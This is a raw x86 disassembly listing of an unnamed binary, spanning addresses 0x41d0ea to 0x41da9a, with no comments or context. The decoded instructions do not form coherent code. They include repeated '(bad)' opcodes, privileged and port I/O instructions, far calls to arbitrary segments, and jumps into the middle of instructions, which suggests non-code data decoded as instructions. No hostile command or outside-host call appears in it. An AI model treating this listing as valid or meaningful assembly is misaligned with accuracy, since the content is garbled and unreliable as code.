  41d0ea:	inc    DWORD PTR [eax]
  41d0ec:	add    BYTE PTR [eax],al
  41d0ee:	add    DWORD PTR [eax+0x43ce32a6],ebx
  41d0f4:	idiv   DWORD PTR [edx+0x73]
  41d0f7:	push   ebx
  41d0f8:	sbb    esi,DWORD PTR [edi-0x19664fa9]
  41d0fe:	add    al,0x5f
  41d100:	cdq    
  41d101:	in     al,0x7d
  41d103:	pop    ss
  41d104:	scas   al,BYTE PTR es:[edi]
  41d105:	cmp    DWORD PTR [ebx+0x1c22509],esi
  41d10b:	test   eax,0x3c84e86a
  41d110:	sbb    al,0xe8
  41d112:	retf   0x7fe
  41d115:	cmp    cl,ch
  41d117:	lds    ebx,FWORD PTR [ebp-0x2ed1ca1]
  41d11d:	int3   
  41d11e:	fisubr WORD PTR [ecx-0x80]
  41d121:	imul   ebp,eax,0x896c227d
  41d127:	adc    eax,0x921f18d2
  41d12c:	sbb    al,dh
  41d12e:	fucom  st(6)
  41d130:	or     al,0x8f
  41d132:	adc    eax,0xac9de9cb
  41d137:	das    
  41d138:	mov    cl,0x9f
  41d13a:	xor    ebx,DWORD PTR [esi-0x38e3f33b]
  41d140:	push   0xc2679e19
  41d145:	mov    dl,0x79
  41d147:	je     0x41d19c
  41d149:	jg     0x41d183
  41d14b:	(bad)  
  41d14c:	jbe    0x41d13a
  41d14e:	cmp    al,0xa9
  41d150:	mov    DWORD PTR [ebx],edx
  41d152:	fnstcw WORD PTR [ecx+0x722b00e]
  41d158:	iret   
  41d159:	das    
  41d15a:	es xor al,0xb4
  41d15d:	fwait
  41d15e:	ds inc esp
  41d160:	stos   BYTE PTR es:[edi],al
  41d161:	xor    cl,ah
  41d163:	jae    0x41d1b1
  41d165:	icebp  
  41d166:	shl    BYTE PTR ds:0x336bc057,0x4e
  41d16d:	not    DWORD PTR [esi]
  41d16f:	mov    ds:0xae6e9c68,al
  41d174:	fstp   TBYTE PTR [ebx+eax*2-0x15af8d95]
  41d17b:	mov    fs:0x16f8b48,eax
  41d181:	add    bl,BYTE PTR [ebx+0x157ebb98]
  41d187:	cwde   
  41d188:	jmp    FWORD PTR [esi+eax*8+0x74]
  41d18c:	sbb    eax,0x8cf190f
  41d191:	shr    cl,0x6e
  41d194:	jae    0x41d158
  41d196:	in     al,0x66
  41d198:	vhsubps ymm4,ymm0,ymm0
  41d19c:	sub    DWORD PTR [ecx+0xc],ecx
  41d19f:	push   ebx
  41d1a0:	sbb    edx,ecx
  41d1a2:	adc    al,0x3e
  41d1a4:	sub    esi,ebp
  41d1a6:	ja     0x41d177
  41d1a8:	ja     0x41d21c
  41d1aa:	loope  0x41d141
  41d1ac:	ffree  st(1)
  41d1ae:	scas   eax,DWORD PTR es:[edi]
  41d1af:	stos   DWORD PTR es:[edi],eax
  41d1b0:	xor    ch,BYTE PTR [eax+0x6f]
  41d1b3:	pop    ecx
  41d1b4:	push   ss
  41d1b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1b6:	(bad)  
  41d1b7:	(bad)  
  41d1b8:	xor    eax,0xbf01fc88
  41d1bd:	dec    edx
  41d1be:	pop    ds
  41d1bf:	repz mov al,0x7
  41d1c2:	cdq    
  41d1c3:	ud1    esp,DWORD PTR [esp]
  41d1c7:	pop    ds
  41d1c8:	lahf   
  41d1c9:	or     bh,BYTE PTR [edx+0x519f0622]
  41d1cf:	mov    ds,WORD PTR [esi-0x4d646116]
  41d1d5:	popa   
  41d1d6:	repnz scas eax,DWORD PTR es:[edi]
  41d1d8:	inc    eax
  41d1d9:	adc    eax,DWORD PTR [edx-0x4d]
  41d1dc:	adc    DWORD PTR [ecx],esi
  41d1de:	cwde   
  41d1df:	add    al,al
  41d1e1:	dec    ebp
  41d1e2:	inc    ebx
  41d1e3:	retf   0xeef5
  41d1e6:	ins    BYTE PTR es:[edi],dx
  41d1e7:	out    dx,eax
  41d1e8:	sub    bh,BYTE PTR [eax-0x52]
  41d1eb:	inc    eax
  41d1ec:	sub    al,0x0
	...
  41d256:	push   eax
  41d257:	ret    
  41d258:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d25e:	xor    DWORD PTR [ebp-0x7],esp
  41d261:	hlt    
  41d262:	jb     0x41d2ba
  41d264:	repnz and eax,DWORD PTR ds:0xff000139
  41d26b:	add    BYTE PTR [eax],al
  41d26d:	add    al,bl
  41d26f:	lahf   
  41d270:	cmp    bh,BYTE PTR [edi+edi*4]
  41d273:	xor    ebp,DWORD PTR [ebx]
  41d275:	jge    0x41d2bd
  41d277:	pop    eax
  41d278:	mov    ebx,0x26998210
  41d27d:	pop    esp
  41d27e:	jecxz  0x41d2b9
  41d280:	dec    esp
  41d281:	xor    al,BYTE PTR [ebx]
  41d283:	push   es
  41d284:	fimul  DWORD PTR [edi]
  41d286:	push   edi
  41d287:	xchg   ecx,esi
  41d289:	mov    eax,ds:0x6288e0c
  41d28e:	call   0xaa7a:0x77fd6809
  41d295:	xor    eax,0x15a786b4
  41d29a:	lods   eax,DWORD PTR ds:[esi]
  41d29b:	push   es
  41d29c:	add    BYTE PTR [ecx],0xca
  41d29f:	inc    edi
  41d2a0:	int3   
  41d2a1:	loop   0x41d2d5
  41d2a3:	lods   al,BYTE PTR ds:[esi]
  41d2a4:	pop    eax
  41d2a5:	cwde   
  41d2a6:	std    
  41d2a7:	out    dx,al
  41d2a8:	scas   al,BYTE PTR es:[edi]
  41d2a9:	mov    BYTE PTR [ecx+0x5436d7f9],ah
  41d2af:	lds    edi,FWORD PTR [eax+0x0]
  41d2b2:	pop    ds
  41d2b3:	add    DWORD PTR [edi+eiz*4+0x14],edx
  41d2b7:	mov    esp,0xcf8ac884
  41d2bc:	xor    ah,BYTE PTR [ebx+0x35]
  41d2bf:	call   0x54c5:0xead297b2
  41d2c6:	fdivrp st(3),st
  41d2c8:	and    al,0xb3
  41d2ca:	ins    BYTE PTR es:[edi],dx
  41d2cb:	js     0x41d28c
  41d2cd:	retf   
  41d2ce:	repnz adc al,0x92
  41d2d1:	xchg   ebp,eax
  41d2d2:	xchg   edx,eax
  41d2d3:	mov    ?,esi
  41d2d5:	jns    0x41d2a5
  41d2d7:	addr16 jg 0x41d2cd
  41d2da:	push   ecx
  41d2db:	inc    esi
  41d2dc:	icebp  
  41d2dd:	push   0x69
  41d2df:	dec    ecx
  41d2e0:	in     eax,0x5b
  41d2e2:	mov    ecx,0x53f4eb2d
  41d2e7:	push   ds
  41d2e8:	or     ebp,ebp
  41d2ea:	addr16 jp 0x41d2c4
  41d2ed:	cmp    BYTE PTR [edi-0x797cabae],0x1d
  41d2f4:	js     0x41d2cb
  41d2f6:	mov    ebp,0x74a83ab6
  41d2fb:	popa   
  41d2fc:	int3   
  41d2fd:	pop    ebp
  41d2fe:	adc    edi,eax
  41d300:	fcmovnb st,st(7)
  41d302:	jge    0x41d2be
  41d304:	push   es
  41d305:	sbb    eax,0x4bf5c040
  41d30a:	xor    DWORD PTR [ecx],0x4e
  41d30d:	int3   
  41d30e:	scas   al,BYTE PTR es:[edi]
  41d30f:	dec    edi
  41d310:	add    BYTE PTR [ebx*1-0x30b01d6],0x25
  41d318:	adc    ah,BYTE PTR [eax+0x77df98c]
  41d31e:	mov    al,0xf4
  41d320:	fwait
  41d321:	(bad)  
  41d322:	retf   0x95c
  41d325:	dec    ecx
  41d326:	mov    esp,0xf43e643c
  41d32b:	and    edi,DWORD PTR [edi+0x60e60fd2]
  41d331:	jl     0x41d33d
  41d333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d334:	test   DWORD PTR [edx],ebx
  41d336:	ja     0x41d357
  41d338:	imul   BYTE PTR [esi]
  41d33a:	not    DWORD PTR [edi+0x49]
  41d33d:	in     eax,0xb
  41d33f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d340:	mov    WORD PTR [edx+0x7a9e70bc],ss
  41d346:	stos   DWORD PTR es:[edi],eax
  41d347:	out    0x15,al
  41d349:	push   ss
  41d34a:	fcomp  DWORD PTR [ecx+ebx*4-0x13830a16]
  41d351:	adc    al,0xdf
  41d353:	pop    ebp
  41d354:	xor    ecx,DWORD PTR [ecx+0x5b7bb5e0]
  41d35a:	jb     0x41d321
  41d35c:	sbb    al,dl
  41d35e:	push   edx
  41d35f:	push   ss
  41d360:	iret   
  41d361:	repnz bound esi,QWORD PTR [ecx-0x48]
  41d365:	xor    al,al
  41d367:	fcmovnb st,st(3)
  41d369:	repz mov dh,0xa7
  41d36c:	inc    edx
	...
  41d3d5:	add    dh,bh
  41d3d7:	cmp    cl,0x54
  41d3da:	(bad)  
  41d3db:	jge    0x41d3dc
  41d3dd:	stos   BYTE PTR es:[edi],al
  41d3de:	lea    ebp,[edi]
  41d3e0:	shr    BYTE PTR [ecx-0x7b],0x81
  41d3e4:	mov    BYTE PTR [eax],al
  41d3e6:	add    al,0x3a
  41d3e8:	add    DWORD PTR [eax],eax
  41d3ea:	inc    DWORD PTR [eax]
  41d3ec:	add    BYTE PTR [eax],al
  41d3ee:	fsubr  st,st(5)
  41d3f0:	inc    esi
  41d3f1:	push   ds
  41d3f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3f3:	xchg   esi,eax
  41d3f4:	or     ch,BYTE PTR [ecx-0x56]
  41d3f7:	in     eax,0xcc
  41d3f9:	out    dx,eax
  41d3fa:	fsubr  DWORD PTR [edx+edi*4-0x62]
  41d3fe:	mov    ds:0xd1c34b57,eax
  41d403:	mov    WORD PTR [eax],ss
  41d405:	xchg   edx,eax
  41d406:	lds    esp,FWORD PTR [ebx+0x48835450]
  41d40c:	test   DWORD PTR [ecx],eax
  41d40e:	cmp    BYTE PTR [esi-0x2a9aaca9],ah
  41d414:	std    
  41d415:	aaa    
  41d416:	push   0x659a4b73
  41d41b:	push   0x33205b89
  41d420:	push   esp
  41d421:	push   es
  41d422:	xchg   edx,eax
  41d423:	sbb    esi,eax
  41d425:	inc    edx
  41d426:	fldenv [ebx]
  41d428:	mov    al,ds:0x6a4aeb32
  41d42d:	call   0x78fe:0x1d7724df
  41d434:	or     eax,0x3099f5e3
  41d439:	dec    ebx
  41d43a:	sub    eax,0xeb5fec5d
  41d43f:	cwde   
  41d440:	sbb    BYTE PTR [eax+edx*8+0x7c03426a],ch
  41d447:	lea    ebx,[ebp+0x33a91ac2]
  41d44d:	and    DWORD PTR [edi+0xa6097e5],eax
  41d453:	cmp    eax,0xb4e422e4
  41d458:	mov    WORD PTR [eax-0x1c43147b],cs
  41d45e:	adc    DWORD PTR [ebx-0x4a4284ca],esi
  41d464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d465:	(bad)  
  41d466:	jge    0x41d457
  41d468:	or     eax,0xc830e2b6
  41d46d:	adc    al,BYTE PTR [edi-0x5b]
  41d470:	repz hlt 
  41d472:	cld    
  41d473:	pop    ds
  41d474:	or     al,0x5c
  41d476:	sbb    al,0xf6
  41d478:	xchg   BYTE PTR [ecx-0x21ea1a34],bh
  41d47e:	bound  ecx,QWORD PTR ds:0xc8821303
  41d484:	xor    eax,0xc258762a
  41d489:	xchg   DWORD PTR [ebx-0x259b2eb0],eax
  41d48f:	and    ecx,DWORD PTR [ebx]
  41d491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d492:	fstp   st(4)
  41d494:	cmp    ebx,DWORD PTR [edx]
  41d496:	cs das 
  41d498:	xchg   esi,eax
  41d499:	pop    edi
  41d49a:	enter  0x5b0d,0x20
  41d49e:	sub    al,0x73
  41d4a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4a1:	int3   
  41d4a2:	sar    BYTE PTR [esi],1
  41d4a4:	jns    0x41d430
  41d4a6:	in     eax,dx
  41d4a7:	ret    
  41d4a8:	xchg   esi,eax
  41d4a9:	and    al,0x35
  41d4ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4ac:	(bad)  
  41d4ae:	test   eax,0xd62f73c5
  41d4b3:	fnsave [esi+0x114b8a76]
  41d4b9:	inc    eax
  41d4ba:	fs sbb al,0x3f
  41d4bd:	pop    edx
  41d4be:	shr    BYTE PTR [eax-0x1de48aca],cl
  41d4c4:	je     0x41d4bf
  41d4c6:	mov    dh,0x71
  41d4c8:	cmp    edx,esi
  41d4ca:	int3   
  41d4cb:	cmp    ah,BYTE PTR [esi-0x28]
  41d4ce:	les    ebp,FWORD PTR [ebp-0x42cd1cf7]
  41d4d4:	push   eax
  41d4d5:	cmp    ch,BYTE PTR [edx+0x33732d]
  41d4db:	shl    DWORD PTR [ebp-0x2990f1a8],cl
  41d4e1:	adc    DWORD PTR [edi+0x153ea6d9],esi
  41d4e7:	out    0xa8,al
  41d4e9:	xor    eax,0x59d9f3
	...
  41d556:	div    BYTE PTR [esi]
  41d558:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d55f:	nop
  41d560:	call   0x3b4:0x8e686889
  41d567:	cmp    eax,DWORD PTR [ecx]
  41d569:	add    bh,bh
  41d56b:	add    BYTE PTR [eax],al
  41d56d:	add    BYTE PTR [ecx-0x53fab7a0],ah
  41d573:	jecxz  0x41d54c
  41d575:	sub    eax,0x84a7562b
  41d57a:	neg    BYTE PTR gs:[esi+0x54]
  41d57e:	jb     0x41d509
  41d580:	dec    eax
  41d581:	jl     0x41d5c3
  41d583:	push   cs
  41d584:	sbb    eax,0x4e35d7e
  41d589:	add    DWORD PTR [eax],eax
  41d58b:	jp     0x41d5ca
  41d58d:	repnz add edi,ecx
  41d590:	push   esi
  41d591:	jnp    0x41d5bd
  41d593:	xchg   esi,eax
  41d594:	jno    0x41d59c
  41d596:	inc    ecx
  41d597:	jmp    0x41d562
  41d599:	and    edx,ebx
  41d59b:	ja     0x41d540
  41d59d:	mov    edi,0xcbbfa802
  41d5a2:	or     eax,0xd50899e7
  41d5a8:	cmp    ah,BYTE PTR [ebp+0x62]
  41d5ab:	inc    esi
  41d5ac:	call   0xaf1f069b
  41d5b1:	imul   eax,DWORD PTR [edi+ebp*4-0x35],0x95ef0114
  41d5b9:	mov    WORD PTR [ebp+esi*2-0x7f56c337],sp
  41d5c1:	cld    
  41d5c2:	lahf   
  41d5c3:	xor    DWORD PTR ds:0x59e33f6d,0x219209e7
  41d5cd:	shr    DWORD PTR [esi-0x67ff1664],cl
  41d5d3:	xor    dh,BYTE PTR [ecx]
  41d5d5:	data16 aaa 
  41d5d7:	sub    ecx,DWORD PTR [eax]
  41d5d9:	int3   
  41d5da:	imul   ecx,edi,0x10e8fdaf
  41d5e0:	and    DWORD PTR [esp+eiz*4],ebx
  41d5e3:	lea    edx,[ecx-0x18ff98bd]
  41d5e9:	bound  edx,QWORD PTR [ecx]
  41d5eb:	enter  0xfa61,0x8b
  41d5ef:	mov    esi,0x7e678f9a
  41d5f4:	adc    al,0x12
  41d5f6:	stos   DWORD PTR es:[edi],eax
  41d5f7:	or     eax,0x4f314cd
  41d5fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5fd:	pop    esp
  41d5fe:	fs in  al,0x5a
  41d601:	xor    BYTE PTR [eax-0x5f],ch
  41d604:	jo     0x41d58f
  41d606:	lahf   
  41d607:	inc    ebp
  41d608:	adc    al,0xa4
  41d60a:	and    eax,0xa39cde63
  41d60f:	mov    esp,0x4b2772f4
  41d614:	je     0x41d5e6
  41d616:	xchg   ebp,eax
  41d617:	cmc    
  41d618:	xor    BYTE PTR [edi+ebp*4-0x6f],al
  41d61c:	inc    ebx
  41d61d:	xchg   ebx,eax
  41d61e:	cld    
  41d61f:	mov    cl,0xab
  41d621:	scas   eax,DWORD PTR es:[edi]
  41d622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d623:	adc    DWORD PTR [ecx],0x46
  41d626:	mov    bh,0x2d
  41d628:	push   ss
  41d629:	cld    
  41d62a:	and    DWORD PTR [ebp+0x798d697c],edi
  41d630:	push   esp
  41d631:	cmp    al,0xff
  41d633:	jmp    0xc82b24bb
  41d638:	aas    
  41d639:	inc    esp
  41d63a:	(bad)  
  41d63b:	dec    si
  41d63d:	pop    ebx
  41d63e:	hlt    
  41d63f:	adc    DWORD PTR [ebx+0xe],ecx
  41d642:	arpl   WORD PTR [ebx],cx
  41d644:	icebp  
  41d645:	das    
  41d646:	mov    ebp,0x3b4f1bf7
  41d64b:	cmp    al,0xbc
  41d64d:	inc    edi
  41d64e:	int3   
  41d64f:	push   edx
  41d650:	aad    0x48
  41d652:	ret    
  41d653:	jnp    0x41d664
  41d655:	enter  0xbca3,0xda
  41d659:	and    ch,cl
  41d65b:	jp     0x41d632
  41d65d:	push   cs
  41d65e:	fwait
  41d65f:	xchg   ecx,eax
  41d660:	in     al,dx
  41d661:	push   ecx
  41d662:	stc    
  41d663:	inc    ebp
  41d664:	popf   
  41d665:	push   es
  41d666:	inc    eax
  41d667:	into   
  41d668:	enter  0x8450,0x16
  41d66c:	sbb    eax,0x0
	...
  41d6d5:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d6d9:	jbe    0x41d6c8
  41d6db:	idiv   DWORD PTR [esi-0x65]
  41d6de:	or     eax,0x5166e435
  41d6e3:	in     eax,dx
  41d6e4:	fbld   TBYTE PTR [eax+0x13c02]
  41d6ea:	inc    DWORD PTR [eax]
  41d6ec:	add    BYTE PTR [eax],al
  41d6ee:	inc    esi
  41d6ef:	fs scas eax,DWORD PTR es:[edi]
  41d6f1:	out    0x4d,al
  41d6f3:	int    0x50
  41d6f5:	add    esp,esi
  41d6f7:	or     edx,DWORD PTR [ecx+0x7827b55e]
  41d6fd:	jae    0x41d76e
  41d6ff:	add    DWORD PTR [edx],eax
  41d701:	cwde   
  41d702:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d703:	mov    ds:0x855a9344,al
  41d708:	rcr    BYTE PTR ds:0x5c986b7d,cl
  41d70e:	shr    DWORD PTR [ebx+esi*1+0x4cc4c51a],1
  41d715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d716:	sbb    al,0x0
  41d718:	test   BYTE PTR [eax],0xd5
  41d71b:	test   dh,bl
  41d71d:	jnp    0x41d753
  41d71f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d720:	xor    esi,esp
  41d722:	fdivrp st(1),st
  41d724:	ins    BYTE PTR es:[edi],dx
  41d725:	shl    DWORD PTR [ebp-0x2adfffed],1
  41d72b:	push   cs
  41d72c:	cmp    eax,DWORD PTR [ebx+0xb]
  41d72f:	mov    bl,0xbf
  41d731:	mov    WORD PTR [edx+ecx*1],ds
  41d734:	xlat   BYTE PTR ds:[ebx]
  41d735:	jnp    0x41d78c
  41d737:	aas    
  41d738:	shl    DWORD PTR [esp+ecx*1-0x4302d63e],1
  41d73f:	out    dx,eax
  41d740:	xchg   ebx,eax
  41d741:	mov    al,0x1
  41d743:	fmulp  st(3),st
  41d745:	cli    
  41d746:	adc    DWORD PTR [ecx*4+0x13e6244],ecx
  41d74d:	gs add eax,0x3ecb2b06
  41d753:	in     eax,0x8c
  41d755:	clc    
  41d756:	add    DWORD PTR [ebp+0x53ff2c74],0xffffffac
  41d75d:	adc    al,0x58
  41d75f:	daa    
  41d760:	es das 
  41d762:	in     al,dx
  41d763:	ja     0x41d71a
  41d765:	jg     0x41d76d
  41d767:	addr16 repz and eax,0x94be397a
  41d76e:	push   esi
  41d76f:	mov    edx,0xea3e0b54
  41d774:	xchg   ecx,eax
  41d775:	int3   
  41d776:	jp     0x41d7f7
  41d778:	jecxz  0x41d772
  41d77a:	je     0x41d702
  41d77c:	nop
  41d77d:	mov    dl,0x31
  41d77f:	(bad)  
  41d781:	jnp    0x41d7fc
  41d783:	or     al,0xc9
  41d785:	inc    esp
  41d786:	aad    0x1e
  41d788:	mov    esp,0x6c023728
  41d78d:	adc    al,BYTE PTR [edx]
  41d78f:	jae    0x41d760
  41d791:	jl     0x41d743
  41d793:	pushf  
  41d794:	(bad)  
  41d795:	ror    BYTE PTR [esi+0x1288628c],1
  41d79b:	jae    0x41d760
  41d79d:	mov    ch,0x31
  41d79f:	push   ecx
  41d7a0:	and    BYTE PTR [ebx],bl
  41d7a2:	icebp  
  41d7a3:	add    DWORD PTR [edi],ecx
  41d7a5:	ret    0xaa42
  41d7a8:	fwait
  41d7a9:	mov    al,0x90
  41d7ab:	and    DWORD PTR [ebx-0x5575a92b],eax
  41d7b1:	enter  0x8212,0x52
  41d7b5:	mov    ebp,0x1a000c36
  41d7ba:	fst    QWORD PTR [ecx-0x65]
  41d7bd:	dec    eax
  41d7be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7bf:	(bad)  
  41d7c0:	rcl    bl,1
  41d7c2:	sbb    ecx,ecx
  41d7c4:	lock push ebp
  41d7c6:	popa   
  41d7c7:	cmc    
  41d7c8:	sbb    al,0x8d
  41d7ca:	in     al,0x78
  41d7cc:	je     0x41d78d
  41d7ce:	cwde   
  41d7cf:	inc    DWORD PTR [ecx]
  41d7d1:	int    0x2b
  41d7d3:	sti    
  41d7d4:	xchg   edx,eax
  41d7d5:	jns    0x41d7bf
  41d7d7:	ret    0x3c34
  41d7da:	(bad)  
  41d7db:	xchg   ecx,eax
  41d7dc:	or     cl,BYTE PTR [edi-0x14]
  41d7df:	and    ch,al
  41d7e1:	retf   
  41d7e2:	add    DWORD PTR [ebx-0x3e51c045],ebx
  41d7e8:	(bad)  
  41d7e9:	sub    eax,DWORD PTR [esi-0x41]
  41d7ec:	adc    eax,DWORD PTR [eax]
	...
  41d856:	and    al,0xce
  41d858:	outs   dx,BYTE PTR ds:[esi]
  41d859:	sub    ch,dh
  41d85b:	stos   BYTE PTR es:[edi],al
  41d85c:	fs into 
  41d85e:	jmp    0x41d7eb
  41d860:	leave  
  41d861:	aas    
  41d862:	push   0xffffff96
  41d864:	js     0x41d8a7
  41d866:	add    DWORD PTR ds:0xff0001,edi
  41d86c:	add    BYTE PTR [eax],al
  41d86e:	and    esp,DWORD PTR [eax+0x5e]
  41d871:	mov    ah,0x1e
  41d873:	clc    
  41d874:	push   es
  41d875:	xchg   ecx,eax
  41d876:	add    DWORD PTR ds:0x6a1b18c3,esp
  41d87c:	cmp    al,0x99
  41d87e:	nop
  41d87f:	dec    BYTE PTR [esi]
  41d881:	lock fcmovnbe st,st(0)
  41d884:	dec    eax
  41d885:	retf   
  41d886:	call   0x1948:0x19cbecb
  41d88d:	nop
  41d88e:	(bad)  
  41d88f:	push   ebp
  41d890:	cwde   
  41d891:	icebp  
  41d892:	ss cmc 
  41d894:	popa   
  41d895:	cmp    ah,bl
  41d897:	cmc    
  41d898:	sub    al,BYTE PTR [esi+0x765d7d6c]
  41d89e:	call   0x29f2:0xa4f91771
  41d8a5:	xor    DWORD PTR [ecx+eiz*4+0x4e],edx
  41d8a9:	add    dl,BYTE PTR ds:0x554842c3
  41d8af:	add    ebx,DWORD PTR [ebx+0x7]
  41d8b2:	call   0x304d:0x6f8228fe
  41d8b9:	popa   
  41d8ba:	sub    al,al
  41d8bc:	(bad)  
  41d8bd:	je     0x41d8ba
  41d8bf:	jae    0x41d8d2
  41d8c1:	xchg   esp,eax
  41d8c2:	jg     0x41d89a
  41d8c4:	ja     0x41d865
  41d8c6:	outs   dx,DWORD PTR ds:[esi]
  41d8c7:	cld    
  41d8c8:	aam    0x89
  41d8ca:	inc    ebx
  41d8cb:	stos   BYTE PTR es:[edi],al
  41d8cc:	push   cs
  41d8cd:	in     al,dx
  41d8ce:	xor    al,0x87
  41d8d0:	stc    
  41d8d1:	enter  0xf1d7,0xca
  41d8d5:	xchg   DWORD PTR [edi+eiz*8],eax
  41d8d8:	ja     0x41d92e
  41d8da:	cmp    dl,bl
  41d8dc:	out    dx,al
  41d8dd:	jb     0x41d8f3
  41d8df:	jp     0x41d917
  41d8e1:	xchg   edi,eax
  41d8e2:	mov    DWORD PTR [esi-0x4548e82c],edx
  41d8e8:	xor    BYTE PTR [ecx-0x4e02d075],dh
  41d8ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8ef:	ins    BYTE PTR es:[edi],dx
  41d8f0:	push   ss
  41d8f1:	adc    bl,BYTE PTR ds:0xbe1793dc
  41d8f7:	mov    ah,0x7c
  41d8f9:	adc    BYTE PTR [edx],cl
  41d8fb:	mov    al,0xc0
  41d8fd:	clc    
  41d8fe:	out    0x6d,al
  41d900:	dec    edi
  41d901:	repnz xchg edx,eax
  41d903:	inc    esi
  41d904:	inc    edx
  41d905:	dec    esi
  41d906:	repnz and ebx,DWORD PTR [ecx+0x398562a9]
  41d90d:	add    edi,esp
  41d90f:	cmp    BYTE PTR [esi],ah
  41d911:	adc    al,0x7f
  41d913:	(bad)  
  41d914:	mov    edi,DWORD PTR [edx+ecx*4-0x157afda5]
  41d91b:	push   ecx
  41d91c:	test   DWORD PTR [edi],edx
  41d91e:	shr    al,0xb2
  41d921:	sti    
  41d922:	dec    edi
  41d923:	aad    0xc9
  41d925:	mov    ds:0x82d10835,eax
  41d92a:	adc    BYTE PTR [ebp-0x53],dh
  41d92d:	call   0xcce7ae4
  41d932:	fmul   st,st(1)
  41d934:	fdiv   QWORD PTR [esi]
  41d936:	mov    cl,0x3d
  41d938:	adc    DWORD PTR [ecx],edi
  41d93a:	or     cl,BYTE PTR [si-0x51b5]
  41d93f:	inc    eax
  41d940:	inc    edi
  41d941:	jg     0x41d9c1
  41d943:	jmp    0x403f:0x9bf4cbc0
  41d94a:	aas    
  41d94b:	xor    DWORD PTR [edx+eiz*2+0x4389a05f],esp
  41d952:	rcl    BYTE PTR [edx],1
  41d954:	out    dx,eax
  41d955:	sub    DWORD PTR [ecx+0x78],eax
  41d958:	jno    0x41d9a2
  41d95a:	popf   
  41d95b:	out    dx,eax
  41d95c:	hlt    
  41d95d:	xor    bh,BYTE PTR [edi]
  41d95f:	mov    edx,DWORD PTR [edx+0x5125093a]
  41d965:	aam    0xd0
  41d967:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d968:	fcom   DWORD PTR [ebx]
  41d96a:	xor    eax,0x44d8
	...
  41d9d3:	add    BYTE PTR [eax],al
  41d9d5:	add    ah,al
  41d9d7:	ins    BYTE PTR es:[edi],dx
  41d9d8:	pop    es
  41d9d9:	pushf  
  41d9da:	scas   eax,DWORD PTR es:[edi]
  41d9db:	(bad)  
  41d9dc:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d9e0:	outs   dx,DWORD PTR ds:[esi]
  41d9e1:	gs int 0xf9
  41d9e4:	mov    ebp,0x13e00e0
  41d9e9:	add    bh,bh
  41d9eb:	add    BYTE PTR [eax],al
  41d9ed:	add    BYTE PTR [edx-0x3],ch
  41d9f0:	dec    ecx
  41d9f1:	cwde   
  41d9f2:	lea    edi,[esi]
  41d9f4:	int3   
  41d9f5:	int3   
  41d9f6:	xchg   esp,eax
  41d9f7:	or     DWORD PTR [ebp-0x2c],esp
  41d9fa:	les    edx,FWORD PTR [esi]
  41d9fc:	pop    esi
  41d9fd:	into   
  41d9fe:	mov    cl,0x6f
  41da00:	dec    ebx
  41da01:	push   es
  41da02:	and    edi,eax
  41da04:	xchg   esi,eax
  41da05:	loopne 0x41da6b
  41da07:	xchg   edx,eax
  41da08:	aad    0x72
  41da0a:	cmp    eax,0x18dea3b1
  41da0f:	mov    ah,0x2b
  41da11:	(bad)  
  41da12:	push   edx
  41da13:	adc    DWORD PTR [esi],esi
  41da15:	aam    0x3e
  41da17:	fs (bad) 
  41da19:	int3   
  41da1a:	mov    DWORD PTR [edx+0x57fe9c86],edi
  41da20:	xorps  xmm4,XMMWORD PTR [edx]
  41da23:	bound  esi,QWORD PTR [ecx]
  41da25:	add    al,0xe1
  41da27:	bound  edi,QWORD PTR [ebx]
  41da29:	mov    cl,0x54
  41da2b:	push   eax
  41da2c:	mov    dh,ch
  41da2e:	or     al,0xd
  41da30:	test   DWORD PTR [edx+0x35045c4d],ecx
  41da36:	hlt    
  41da37:	adc    BYTE PTR [edx-0x72],0xb2
  41da3b:	or     al,0x57
  41da3d:	mov    eax,0xe88d0d6e
  41da42:	mov    eax,0x35fdbc9c
  41da47:	mov    DWORD PTR [ebx+0x5a],ecx
  41da4a:	stos   DWORD PTR es:[edi],eax
  41da4b:	fidivr DWORD PTR [ebx+0x46]
  41da4e:	das    
  41da4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da50:	and    esi,DWORD PTR [edi]
  41da52:	(bad)  
  41da53:	xlat   BYTE PTR ds:[ebx]
  41da54:	push   ds
  41da55:	cmp    BYTE PTR [edi+ebp*8],ah
  41da58:	cmp    ebx,ecx
  41da5a:	outs   dx,BYTE PTR ds:[esi]
  41da5b:	mov    edx,0xe83cc8a5
  41da60:	and    bl,BYTE PTR [ecx+0x5b7a97b9]
  41da66:	add    eax,DWORD PTR [ebx+edi*2+0x56b83f0c]
  41da6d:	adc    ah,ch
  41da6f:	in     eax,dx
  41da70:	retf   0x62c5
  41da73:	in     eax,0x10
  41da75:	jl     0x41da4d
  41da77:	lock xchg edx,eax
  41da79:	ss (bad) 
  41da7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da7c:	add    esi,esi
  41da7e:	mul    edx
  41da80:	sbb    DWORD PTR ds:0x6b93bcdd,ecx
  41da86:	(bad)  
  41da87:	pop    esp
  41da88:	push   esp
  41da89:	or     al,BYTE PTR [eax]
  41da8b:	rol    esp,0xe6
  41da8e:	push   edi
  41da8f:	(bad)  
  41da90:	lods   eax,DWORD PTR ds:[esi]
  41da91:	ror    DWORD PTR [eax],1
  41da93:	enter  0x9eee,0xb1
  41da97:	inc    esp
  41da98:	jo     0x41da46
  41da9a:	dec    eax
